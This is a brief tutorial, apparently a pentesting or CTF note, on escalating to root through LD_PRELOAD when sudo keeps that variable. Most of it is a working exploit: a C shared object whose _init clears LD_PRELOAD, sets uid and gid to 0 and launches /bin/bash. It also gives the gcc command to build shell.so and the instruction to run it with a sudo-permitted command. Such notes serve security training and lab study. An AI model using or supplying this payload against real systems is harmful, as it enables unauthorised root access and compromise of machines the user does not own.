![image](https://user-images.githubusercontent.com/96658935/147622984-7193ceee-663b-4649-b16c-65016f201af4.png)


This means we can run a script before any other libraries. When you run sudo -l and see this output do the following:


```bash
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

```
* save file as [x].c so it can be compiled.
* This code includes standard io,sys types, and standard libraries.
* Then it unsets the library preload which is LD_PRELOAD.
* Then set setgid and setuid to zero which is root.
* Then the system executes /bin/bash.


```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

* compile with gcc
* -fPIC - means regardless where your shell addressing is this is going to function.

![image](https://user-images.githubusercontent.com/96658935/147623630-592e8830-8d78-4622-8b83-17850228b9e2.png)

Now that it's compiled you can run it with one of the sudo-l commands and get root
